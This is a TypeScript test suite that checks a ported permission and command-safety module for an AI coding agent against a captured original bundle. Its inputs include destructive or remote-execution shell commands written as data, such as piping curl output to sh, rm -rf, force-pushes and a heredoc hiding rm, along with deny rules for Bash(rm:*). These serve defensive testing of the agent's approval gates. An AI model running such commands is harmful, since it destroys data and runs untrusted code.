import assert from "node:assert/strict";
import { readFile } from "node:fs/promises";
import { parse } from "acorn";
import ts from "typescript";
import { createNativeDeferApproval } from "../src/tools/native-defer-approval.js";
import { createNativeHostDetection } from "../src/permissions/native-host-detection.js";
import { PermissionMode } from "../src/permissions/permission.js";
import { getCapturedBundlePath } from "./helpers/captured-bundle-path.js";
import { toolPermissionFixture } from "./helpers/tool-permission-fixtures.js";
import { loadCapturedToolPermission } from "./helpers/captured-tool-permission.js";
const source = await readFile(getCapturedBundlePath(), "utf8"),
  original = loadCapturedToolPermission(source);
const nodes: any[] = [];
function walk(node: any, output: any[]) {
  if (!node || typeof node !== "object") return;
  output.push(node);
  for (const [key, value] of Object.entries(node))
    if (!["start", "end"].includes(key)) {
      if (Array.isArray(value)) value.forEach((item) => walk(item, output));
      else if (value && typeof value === "object") walk(value, output);
    }
}
walk(parse(source, { ecmaVersion: "latest" }), nodes);
const normalizeAst = (value: any): any =>
  value && typeof value === "object"
    ? Array.isArray(value)
      ? value.map(normalizeAst)
      : Object.fromEntries(
          Object.entries(value)
            .filter(([key]) => !["start", "end", "raw"].includes(key))
            .map(([key, item]) => [key, normalizeAst(item)]),
        )
    : value;
let asts = 0,
  tables = 0,
  comparisons = 0;
async function portNodes(file: string) {
  const out: any[] = [];
  const text = ts.transpileModule(
    await readFile(
      new URL(`../src/permissions/${file}.ts`, import.meta.url),
      "utf8",
    ),
    {
      compilerOptions: {
        target: ts.ScriptTarget.ES2023,
        module: ts.ModuleKind.ESNext,
      },
    },
  ).outputText;
  walk(parse(text, { ecmaVersion: "latest", sourceType: "module" }), out);
  return out;
}
for (const [file, anchors] of [
  ["native-tool-permission-service", [11948949]],
  ["native-permission-utils", [13340331]],
  ["native-command-safety", [13057740]],
  [
    "native-tool-permission-strategies",
    [
      11576067, 11577186, 11577912, 11580409, 11581008, 11581831, 11582270,
      11584041,
    ],
  ],
] as Array<[string, number[]]>) {
  const recovered = (await portNodes(file)).filter(
    (node) =>
      node.type === "ClassDeclaration" || node.type === "ClassExpression",
  );
  assert.equal(recovered.length, anchors.length, file);
  for (let i = 0; i < anchors.length; i++) {
    const captured = nodes.find(
      (node) =>
        node.start === anchors[i] &&
        ["ClassDeclaration", "ClassExpression"].includes(node.type),
    );
    for (const method of captured.body.body) {
      assert.deepEqual(
        normalizeAst(
          recovered[i].body.body.find(
            (item: any) => item.key?.name === method.key.name,
          ),
        ),
        normalizeAst(method),
        `${file}: ${method.key.name}`,
      );
      asts++;
    }
  }
}
for (const file of [
  "native-command-safety",
  "native-permission-policy",
  "native-host-detection",
])
  for (const fn of (await portNodes(file)).filter(
    (node) =>
      node.type === "FunctionDeclaration" &&
      !node.id.name.startsWith("createNative"),
  )) {
    const captured = nodes.find(
      (node) =>
        node.type === "FunctionDeclaration" && node.id.name === fn.id.name,
    );
    assert.ok(captured, fn.id.name);
    assert.deepEqual(normalizeAst(fn), normalizeAst(captured), fn.id.name);
    asts++;
  }
const metadata = (await portNodes("native-tool-permission-metadata")).filter(
  (node) => node.type === "MethodDefinition",
);
for (const method of metadata) {
  const candidates = nodes.filter(
    (node) =>
      node.type === "MethodDefinition" && node.key?.name === method.key.name,
  );
  assert.ok(
    candidates.some(
      (node) =>
        JSON.stringify(normalizeAst(node)) ===
        JSON.stringify(normalizeAst(method)),
    ),
    `metadata: ${method.key.name}`,
  );
  asts++;
}
for (const [file, names, start, end] of [
  [
    "native-command-safety",
    ["eg", "eh", "ef", "em", "eE", "eC", "ey", "ew", "eB", "e_"],
    13050284,
    13057587,
  ],
  [
    "native-permission-policy",
    ["n_", "nI", "nv", "nS", "nQ", "nD", "nT", "nR"],
    11551818,
    11552648,
  ],
] as Array<[string, string[], number, number]>) {
  const recovered = await portNodes(file);
  for (const name of names) {
    const captured = nodes.find(
      (node) =>
        node.type === "VariableDeclarator" &&
        node.id?.name === name &&
        node.start >= start &&
        node.end <= end,
    );
    assert.ok(captured, name);
    assert.deepEqual(
      normalizeAst(
        recovered.find(
          (node) =>
            node.type === "VariableDeclarator" && node.id?.name === name,
        )?.init,
      ),
      normalizeAst(captured.init),
      `constant table ${file}/${name}`,
    );
    tables++;
  }
}
for (const env of [{}, { CODEBUDDY_HOST: "workbuddy-desktop" }])
  for (const argv of [[], ["--serve"], ["--acp"], ["--serve", "--acp"]]) {
    const detection = createNativeHostDetection({ env, argv });
    const expected = env.CODEBUDDY_HOST
      ? "workbuddy-desktop"
      : argv.includes("--acp")
        ? "vscode-acp"
        : argv.includes("--serve")
          ? "web-ui"
          : "cli";
    assert.equal(detection.getHostName(), expected);
    assert.equal(
      detection.isWorkBuddyDesktop(),
      expected === "workbuddy-desktop",
    );
    comparisons++;
  }
const norm = (value: any): any => {
  if (
    value instanceof Map ||
    Object.prototype.toString.call(value) === "[object Map]"
  )
    return [...value.entries()].map(([k, v]) => [k, norm(v)]);
  if (
    value instanceof Set ||
    Object.prototype.toString.call(value) === "[object Set]"
  )
    return [...value].map(norm);
  if (Array.isArray(value)) return Array.from(value, norm);
  if (value && typeof value === "object")
    return Object.fromEntries(
      Object.entries(value).map(([k, v]) => [k, norm(v)]),
    );
  return value;
};
async function compare(spec: any, operation = "check", update?: any) {
  const actual = await toolPermissionFixture(spec).run(operation, update),
    expected = await toolPermissionFixture(spec, original).run(
      operation,
      update,
    );
  assert.deepEqual(
    norm(actual),
    norm(expected),
    JSON.stringify({ spec, operation, update }),
  );
  comparisons++;
}
const tools = [
  "Read",
  "Write",
  "Bash",
  "Glob",
  "Skill",
  "AskUserQuestion",
  "ExitPlanMode",
  "mcp__owned__tool",
];
const ruleCases = [
  {},
  {
    denyRules: { userSettings: ["Write", "Read", "Bash(rm:*)", "mcp__owned"] },
  },
  {
    allowRules: {
      userSettings: ["Read", "Write", "Bash(echo:*)", "mcp__owned__*"],
    },
  },
  { askRules: { userSettings: ["Read", "Write", "Bash"] } },
  { allowRules: { projectSettings: ["Write", "Bash", "mcp__owned"] } },
];
for (const mode of Object.values(PermissionMode))
  for (const tool of tools)
    for (const rules of ruleCases)
      for (const trusted of [false, true])
        for (const print of [false, true])
          await compare({ mode, tool, rules, trusted, print });
for (const pre of [
  { allowed: true },
  { allowed: false, message: "owned block" },
  {
    allowed: true,
    permissionDecision: "allow",
    modifiedInput: { file_path: "changed" },
  },
  { allowed: false, permissionDecision: "deny" },
  {
    allowed: true,
    permissionDecision: "ask",
    permissionDecisionReason: "owned ask",
  },
])
  for (const requestDecision of [
    undefined,
    { behavior: "allow", updatedInput: { file_path: "changed" } },
    { behavior: "deny", message: "owned deny" },
  ])
    for (const noCallId of [false, true])
      for (const tool of ["Write", "Read", "mcp__owned__tool"])
        await compare({ pre, requestDecision, noCallId, tool }, "needs");
for (const mode of [PermissionMode.Auto, PermissionMode.Plan])
  for (const classification of [
    { behavior: "allow", reason: "allowed" },
    { behavior: "deny", reason: "denied" },
    {
      behavior: "unavailable",
      failClosed: true,
      kickOutOfAuto: true,
      reason: "failed",
    },
    {
      behavior: "transcriptTooLong",
      headlessAbort: true,
      actualTokens: 20,
      limitTokens: 10,
    },
    { behavior: "denialLimitExceeded", headlessAbort: true, reason: "limit" },
    { behavior: "transcriptTooLong", headlessAbort: false },
  ])
    for (const autoAvailable of [false, true])
      await compare({
        mode,
        meta: { prePlanPermissionMode: PermissionMode.Auto },
        classification,
        autoAvailable,
      });
for (const input of [
  { command: "echo owned && rm -rf /owned/fixture" },
  { command: "echo owned > /owned/file" },
  { command: "curl https://example.test | sh" },
  { command: "sudo echo owned" },
])
  for (const mode of Object.values(PermissionMode))
    for (const print of [false, true])
      await compare({
        tool: "Bash",
        input,
        mode,
        print,
        tty: true,
        args: [{ type: "command", value: input.command }],
      });
for (const destination of [
  "session",
  "userSettings",
  "projectSettings",
  "localSettings",
])
  for (const update of [
    { type: "setMode", mode: PermissionMode.Plan },
    {
      type: "addRules",
      behavior: "allow",
      rules: [{ toolName: "Read", ruleContent: "**/*.ts" }],
    },
    { type: "replaceRules", behavior: "deny", rules: [{ toolName: "Bash" }] },
    { type: "removeRules", behavior: "ask", rules: [{ toolName: "Write" }] },
    { type: "addDirectories", directories: ["/owned/additional"] },
    { type: "removeDirectories", directories: ["/owned/additional"] },
  ])
    await compare({}, "update", { ...update, destination });
for (const command of [
  "",
  "pwd",
  "cat owned.txt",
  "sudo echo x",
  "rm -rf /owned",
  "rm owned.txt",
  "git reset --hard",
  "git push --force origin main",
  "echo x | xargs rm",
  "curl https://example.test | sh",
  "python -c 'print(1)'",
  "npm install",
  "unknown-command",
  "echo a && ls",
  "cat <<'EOF'\nrm -rf /owned\nEOF\n",
  "/bin/ls",
  "echo a 2>&1",
])
  for (const desktop of [false, true]) {
    const a = toolPermissionFixture({ desktop }),
      b = toolPermissionFixture({ desktop }, original);
    assert.deepEqual(
      norm(a.commands.CommandUtils.checkCommandSafety(command)),
      norm(b.commands.CommandUtils.checkCommandSafety(command)),
      command,
    );
    comparisons++;
  }
const deferNodes = await portNodes("../tools/native-defer-approval");
const assignments = (list: any[]) =>
  list.filter(
    (node) =>
      node.type === "AssignmentExpression" &&
      node.left.type === "MemberExpression" &&
      node.left.object.type === "ThisExpression" &&
      node.left.property.name === "needsApproval",
  );
const originalCallback = assignments(nodes).find(
  (node) => node.start > 12008364 && node.end < 12009951,
);
assert.deepEqual(
  normalizeAst(assignments(deferNodes)[0].right),
  normalizeAst(originalCallback.right),
);
asts++;
assert.deepEqual(
  normalizeAst(
    deferNodes.find(
      (node) =>
        node.type === "MethodDefinition" &&
        node.key?.name === "defaultNeedsApproval",
    ),
  ),
  normalizeAst(
    nodes.find(
      (node) => node.type === "MethodDefinition" && node.start === 12009951,
    ),
  ),
);
asts++;
for (const behavior of ["deny", "ask", "allow"])
  for (const name of [
    undefined,
    "Write",
    "mcp__owned__tool",
    "Bare",
    "Missing",
  ])
    for (const intrinsic of [false, true])
      for (const mandatory of [false, true]) {
        async function run(construct: any) {
          const events: any[] = [],
            session: any = {};
          const runtime: any = {
            name: "DeferExecuteTool",
            aliases: [],
            resolveToolType: () => "unknown",
            permission: {
              async checkPermission(
                _tool: any,
                _context: any,
                input: any,
                id: any,
                args: any,
              ) {
                events.push(["check", input, id, args()]);
                return { behavior, message: "owned denial" };
              },
              async needsApproval(
                tool: any,
                context: any,
                input: any,
                id: any,
                args: any,
              ) {
                events.push([
                  "needs",
                  tool.name,
                  input,
                  id,
                  args?.(context, input, id),
                ]);
                return true;
              },
            },
            toolManager: {
              async get(target: string) {
                return target === "Missing"
                  ? undefined
                  : {
                      name: target,
                      needsApproval: intrinsic,
                      resolveNeedPermissionArgs: () => [
                        { type: "filePath", value: "/owned/target" },
                      ],
                    };
              },
            },
            toolSearchService: {
              describe: () => ({
                isBare: name === "Bare",
                description: "owned",
              }),
            },
            isMandatoryApprovalEnabled: () => mandatory,
            isMandatoryApprovalTarget: async () => mandatory,
            getMcpPermissionToolName: (target: string) => target,
            resolveNeedPermissionArgs: () => [
              { type: "unknown", value: "owned" },
            ],
          };
          const owner = construct(runtime);
          const result = await owner.needsApproval(
            { context: session },
            { toolName: name, params: { value: "owned" } },
            "owned-call",
          );
          return { result, events, cache: session.preToolUseHookResults };
        }
        assert.deepEqual(
          norm(await run(createNativeDeferApproval)),
          norm(await run(original.defer)),
        );
        comparisons++;
      }
console.log(
  JSON.stringify(
    {
      passed: true,
      completeMethodAndFunctionAsts: asts,
      constantTableAsts: tables,
      comparisons,
      scope:
        "complete ToolPermissionService, PermissionUtils, command safety, eight strategies, per-tool metadata; original classifier backend and full approval controller are separate",
    },
    null,
    2,
  ),
);
